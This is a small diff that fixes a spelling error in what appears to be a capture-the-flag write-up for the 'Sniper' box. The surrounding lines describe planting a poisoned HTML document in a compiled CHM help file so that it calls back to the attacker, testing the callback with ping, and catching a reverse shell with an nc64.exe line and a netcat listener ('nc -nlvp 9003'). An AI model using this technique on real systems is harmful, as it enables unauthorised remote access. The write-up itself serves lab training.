@@ -404,7 +404,7 @@ sqlsodbc.chm                                                C:\Windows\Help\mui\
   x.Click();
 &lt;/SCRIPT&gt;
 </code></pre><p>From there, we can download <a href="https://www.microsoft.com/en-us/download/details.aspx?id=21138" target="_blank">HTML Help Workshop</a>
- and recompile the CHM file inclusive of our newly poisened HTML doc. You can also compile a new project from scratch to do this, completely omitting KeyTools altogether.</p>
+ and recompile the CHM file inclusive of our newly poisoned HTML doc. You can also compile a new project from scratch to do this, completely omitting KeyTools altogether.</p>
 <p>For me, getting this to actually work was massively hit and miss. A good test before running this is to get the box to ping you via <code>ping -n 2 &lt;IP.ADDRESS&gt;</code> - changing the value of the Item1 parameter in our XML code above will acheive this.</p>
 <p>Once confirmed I compiled the CHM with the nc64.exe line and moved it into C:\Docs - with a listener running. After a few attempts we get a call back:</p>
 <pre><code>skynet Boxes/Sniper » nc -nlvp 9003
